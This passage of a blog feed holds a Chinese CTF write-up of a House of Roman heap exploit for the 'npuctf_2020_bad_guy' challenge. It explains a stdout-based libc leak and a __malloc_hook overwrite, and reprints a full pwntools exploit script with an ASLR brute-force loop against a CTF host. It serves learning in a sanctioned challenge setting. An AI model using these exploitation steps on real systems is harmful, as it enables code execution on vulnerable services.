color=\"red\">重叠的目的是把unsortedbin的fd的地址放到fastbin地址那里,让fastbin能利用这个地址进行申请</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc(<span class=\"number\">0</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">   malloc(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">   malloc(<span class=\"number\">2</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">   malloc(<span class=\"number\">3</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">   free(<span class=\"number\">2</span>)</span><br><span class=\"line\">   payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x91</span>)<span class=\"comment\"># + p64(0) * 3 + p64(0x91)</span></span><br><span class=\"line\">   edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">   free(<span class=\"number\">1</span>)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\">   malloc(<span class=\"number\">4</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t没有malloc 0x10前,可以看到fastbin的位置,以及它的fd是没有值的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_15-52-48.jpg\" alt=\"Snipaste_2023-10-25_15-52-48\"></p>\n<p>​\tmalloc后</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-13-46.jpg\" alt=\"Snipaste_2023-10-25_16-13-46\"></p>\n<p>​\t将后四字节修改为0x255，然后malloc两次就可以分到_IO_2_1_stdout _上面的位置,之所以要分配0x25dd那里,是因为要满足堆的大小检查要求</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x71</span>) + p16(<span class=\"number\">0x25dd</span>) <span class=\"comment\">#* 3 + p64(0x91)</span></span><br><span class=\"line\">   edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\">   malloc(<span class=\"number\">5</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\">   payload = <span class=\"number\">0x33</span> * p8(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xfbad800</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p8(<span class=\"number\">0</span>)</span><br><span class=\"line\">   malloc(<span class=\"number\">6</span>,<span class=\"number\">0x60</span>,payload)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-17-59.jpg\" alt=\"Snipaste_2023-10-25_16-17-59\"></p>\n<p>​\t不满足要求的话会报错 <strong>Error in &#96;.&#x2F;npuctf_2020_bad_guy’: malloc(): memory corruption (fast): 0x00007ffff7dd25f5</strong> ,这一块等分析源码的时候再细看</p>\n<p>​\tmalloc完之后,_IO_2_1_stdout的flags就被修改了， 也就是要修改对应flag的值 和 _IO_write_base, _IO_write_ptr, _IO_write_end等 就会自动输出缓存区的信息??????</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-20-04.jpg\" alt=\"Snipaste_2023-10-25_16-20-04\"></p>\n<p>​\t然后就会泄露libc地址了,泄漏的地址是多少呢,是0x7ffff7dd2600,<font color=\"red\">为啥呢?</font>,减去偏移就得到了基址</p>\n<p> payload &#x3D; 0x33 * p8(0) + p64(0xfbad800) + p64(0)*3 + p8(0)</p>\n<p>(0x33 &#x3D; 51  &#x3D; 6*8 + 3)   + 2  *  8 +1    &#x3D; 8 * 8 + 4</p>\n<p>从 0xed那里开始输入数据, 0x33 * p8(0)  &#x3D; 51, 而0x2620-0x25ed正好是51</p>\n<h3 id=\"故伎重演-替换malloc-hook为onegadget\"><a href=\"#故伎重演-替换malloc-hook为onegadget\" class=\"headerlink\" title=\"故伎重演,替换malloc_hook为onegadget\"></a>故伎重演,替换malloc_hook为onegadget</h3><p>​\t此时堆的布局的话,还有一个0x60大小的unsortedbin, 分了再free放进fastbin, 此时有地址了,就不需要那么麻烦再利用unsortedbin的地址了,直接edit修改就可以了,然后两次malloc把__malloc_hook那里改为onegadget</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc(<span class=\"number\">7</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\">   free(<span class=\"number\">7</span>)</span><br><span class=\"line\">   payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x71</span>) + p64(libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x23</span>) <span class=\"comment\">#* 3 + p64(0x91)</span></span><br><span class=\"line\">   edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">   malloc(<span class=\"number\">8</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">   payload = <span class=\"number\">0x13</span> * p8(<span class=\"number\">0</span>) + p64(libc.offset_to_vaddr(one[<span class=\"number\">3</span>]))</span><br><span class=\"line\">   malloc(<span class=\"number\">9</span>,<span class=\"number\">0x60</span>,payload)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"如何开启了alsr-如何爆破呢\"><a href=\"#如何开启了alsr-如何爆破呢\" class=\"headerlink\" title=\"如何开启了alsr 如何爆破呢\"></a>如何开启了alsr 如何爆破呢</h3><p>​\t学到了, 这样获取错误, 以前自己写循环tryexcept这里一直有问题,回头可以试试用这里的是否可以</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        pwn()</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> KeyboardInterrupt:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"string\">&quot;27593&quot;</span>)</span><br><span class=\"line\">        <span class=\"comment\">#p = process(binary)</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> :</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        <span class=\"comment\">#p = process(binary)</span></span><br><span class=\"line\">        p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"string\">&quot;27593&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>枚举的话, 不用增加点偏移吗, 或者说偏移也有可能是0?</strong></p>\n<h2 id=\"一些细节\"><a href=\"#一些细节\" class=\"headerlink\" title=\"一些细节\"></a>一些细节</h2><h3 id=\"libc的版本\"><a href=\"#libc的版本\" class=\"headerlink\" title=\"libc的版本\"></a>libc的版本</h3><p>​\t做题的话注意一下版本,buuctf用的是2.23-0ubuntu11_amd64,这个版本我在网上没找到,找到的没符号,自己编译的还报错(用ubuntu20编译的,不知道16是不是可以)</p>\n<p>​\t不同版本偏移不一样</p>\n<p>​\t但是那个2.23- 多少是一样的</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><p>用的这位师傅的: <a href=\"https://blog.csdn.net/csdn546229768/article/details/123717993\">https://blog.csdn.net/csdn546229768/article/details/123717993</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import sys</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">SigreturnFrame(kernel = <span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">binary = <span class=\"string\">&quot;./npuctf_2020_bad_guy&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">one = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]  <span class=\"comment\">#2.23-0ubuntu11.3</span></span><br><span class=\"line\"><span class=\"comment\">#one = [0x45216,0x4526a,0xf02a4,0xf1147] # buuctf</span></span><br><span class=\"line\"><span class=\"comment\">#idx = int(sys.argv[1])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">global</span> p</span><br><span class=\"line\">local = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = process(binary)</span><br><span class=\"line\">    <span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">    e = ELF(binary)</span><br><span class=\"line\">    libc = e.libc</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"string\">&quot;27593&quot;</span>)</span><br><span class=\"line\">    e = ELF(binary)</span><br><span class=\"line\">    <span class=\"comment\">#libc = e.libc</span></span><br><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./libc-2.23.buu.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ Condfig ############################################</span></span><br><span class=\"line\">sd = <span class=\"keyword\">lambda</span> s:p.send(s)</span><br><span class=\"line\">sl = <span class=\"keyword\">lambda</span> s:p.sendline(s)</span><br><span class=\"line\">rc = <span class=\"keyword\">lambda</span> s:p.recv(s)</span><br><span class=\"line\">ru = <span class=\"keyword\">lambda</span> s:p.recvuntil(s)</span><br><span class=\"line\">sa = <span class=\"keyword\">lambda</span> a,s:p.sendafter(a,s)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class=\"line\">it = <span class=\"keyword\">lambda</span> :p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">z</span>(<span class=\"params\">s=<span class=\"string\">&#x27;b main&#x27;</span></span>):</span><br><span class=\"line\">    gdb.attach(p,s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">logs</span>(<span class=\"params\">mallocr,string=<span class=\"string\">&#x27;logs&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">isinstance</span>(mallocr,<span class=\"built_in\">int</span>)):</span><br><span class=\"line\">       <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[1;31;40m%20s--&gt;0x%x\\033[0m&#x27;</span>%(string,mallocr))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">       <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[1;31;40m%20s--&gt;%s\\033[0m&#x27;</span>%(string,mallocr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pa</span>(<span class=\"params\">s=<span class=\"string\">&#x27;1&#x27;</span></span>):</span><br><span class=\"line\">    log.success(<span class=\"string\">&#x27;pause : step---&gt; &#x27;</span>+<span class=\"built_in\">str</span>(s))</span><br><span class=\"line\">    pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">info</span>(<span class=\"params\">data,key=<span class=\"string\">&#x27;info&#x27;</span>,bit=<span class=\"number\">64</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(bit == <span class=\"number\">64</span>):</span><br><span class=\"line\">      leak = u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">      leak = u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">    logs(leak,key)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> leak</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ Function ############################################</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">malloc</span>(<span class=\"params\">i,s,c = <span class=\"string\">&#x27;A&#x27;</span></span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Index :&#x27;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;size:&#x27;</span>,<span class=\"built_in\">str</span>(s))</span><br><span class=\"line\">    sa(<span class=\"string\">&#x27;Content:&#x27;</span>,c)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">i,s,c = <span class=\"string\">&#x27;A&#x27;</span></span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Index :&#x27;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;size:&#x27;</span>,<span class=\"built_in\">str</span>(s))</span><br><span class=\"line\">    sa(<span class=\"string\">&#x27;content:&#x27;</span>,c)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Index :&#x27;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"><span class=\"comment\">################################### Statr ############################################</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    malloc(<span class=\"number\">0</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    malloc(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    malloc(<span class=\"number\">2</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    malloc(<span class=\"number\">3</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    free(<span class=\"number\">2</span>)</span><br><span class=\"line\">    payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x91</span>)<span class=\"comment\"># + p64(0) * 3 + p64(0x91)</span></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    malloc(<span class=\"number\">4</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x71</span>) + p16(<span class=\"number\">0x25dd</span>) <span class=\"comment\">#* 3 + p64(0x91)</span></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    malloc(<span class=\"number\">5</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    payload = <span class=\"number\">0x33</span> * p8(<span class=\"number\">1</span>) + p64(<span class=\"number\">0xfbad800</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p8(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    malloc(<span class=\"number\">6</span>,<span class=\"number\">0x60</span>,payload)</span><br><span class=\"line\">    <span class=\"comment\">#pa()</span></span><br><span class=\"line\">    <span class=\"comment\">#libc.address = info(ru(&#x27;\\x7f&#x27;)[-6:]) - (0x7ffff7dd2600 - 0x7ffff7a0d000)</span></span><br><span class=\"line\">    <span class=\"comment\">#libc.address = info(ru(&#x27;\\x7f&#x27;)[-6:])</span></span><br><span class=\"line\">    <span class=\"comment\">#print(hex(libc.address))</span></span><br><span class=\"line\">    libc.address = info(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:]) - (<span class=\"number\">0x7ffff7dd2600</span> - <span class=\"number\">0x7ffff7a0d000</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc.address))</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    malloc(<span class=\"number\">7</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    free(<span class=\"number\">7</span>)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x71</span>) + p64(libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x23</span>) <span class=\"comment\">#* 3 + p64(0x91)</span></span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">    malloc(<span class=\"number\">8</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    payload = <span class=\"number\">0x13</span> * p8(<span class=\"number\">0</span>) + p64(libc.offset_to_vaddr(one[<span class=\"number\">3</span>]))</span><br><span class=\"line\">    malloc(<span class=\"number\">9</span>,<span class=\"number\">0x60</span>,payload)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Index :&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">10</span>))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;size:&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">10</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"><span class=\"comment\">################################### End ##############################################</span></span><br><span class=\"line\">pwn()</span><br><span class=\"line\">p.close()</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">while 1:</span></span><br><span class=\"line\"><span class=\"string\">    try:</span></span><br><span class=\"line\"><span class=\"string\">        pwn()</span></span><br><span class=\"line\"><span class=\"string\">        break</span></span><br><span class=\"line\"><span class=\"string\">    except KeyboardInterrupt:</span></span><br><span class=\"line\"><span class=\"string\">        p.close()</span></span><br><span class=\"line\"><span class=\"string\">        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)</span></span><br><span class=\"line\"><span class=\"string\">        #p = process(binary)</span></span><br><span class=\"line\"><span class=\"string\">    except :</span></span><br><span class=\"line\"><span class=\"string\">        p.close()</span></span><br><span class=\"line\"><span class=\"string\">        #p = process(binary)</span></span><br><span class=\"line\"><span class=\"string\">        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/u014377094/article/details/124577350\">https://blog.csdn.net/u014377094/article/details/124577350</a></p>\n<p><a href=\"https://blog.csdn.net/csdn546229768/article/details/123717993\">https://blog.csdn.net/csdn546229768/article/details/123717993</a></p>\n<p>IO_stdout泄漏libc</p>\n<p>pwndbg: parseheap</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/320151545\">https://zhuanlan.zhihu.com/p/320151545</a> 这个蛮详细的</p>\n<p><a href=\"https://blog.csdn.net/zzq487782568/article/details/123773034\">https://blog.csdn.net/zzq487782568/article/details/123773034</a> 这个整体思路可以 利用unstortedbin打stdout泄露出libc</p>\n<p><a href=\"https://www.cnblogs.com/LynneHuan/p/14851770.html\">https://www.cnblogs.com/LynneHuan/p/14851770.html</a></p>\n<p><a href=\"https://j-kangel.github.io/2020/03/13/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E6%BC%8Flibc/#%E5%88%86%E6%9E%90\">https://j-kangel.github.io/2020/03/13/利用-IO-2-1-stdout-泄漏libc/#分析</a></p>\n<h1 id=\"遗留问题\"><a href=\"#遗留问题\" class=\"headerlink\" title=\"遗留问题\"></a>遗留问题</h1><p>为什么后来分配的 malloc(4,0x10)的fd和nt是那个值呢？</p>\n<p><strong>枚举的话, 不用增加点偏移吗, 或者说偏移也有可能是0?</strong></p>\n<p>pwndbg: parseheap</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-43-pwn%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-43-pwn%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/",
            "title": "pwn入门-43-pwn做题环境搭建脚本",
            "date_published": "2023-10-04T12:56:34.000Z",
            "content_html": "<p>​\t\t之前m1不支持x86,一直用云服务器有时候经常换,每次都需要手动搭建环境,一直想写个脚本,但有时候一直懒…终于整理出来了..</p>\n<p><font color=\"red\">(感谢chatgpt)</font></p>\n<p>​\t\t然后这个脚本目前还有很多小问题和可以改进的地方</p>\n<h2 id=\"要安装的内容\"><a href=\"#要安装的内容\" class=\"headerlink\" title=\"要安装的内容\"></a>要安装的内容</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span 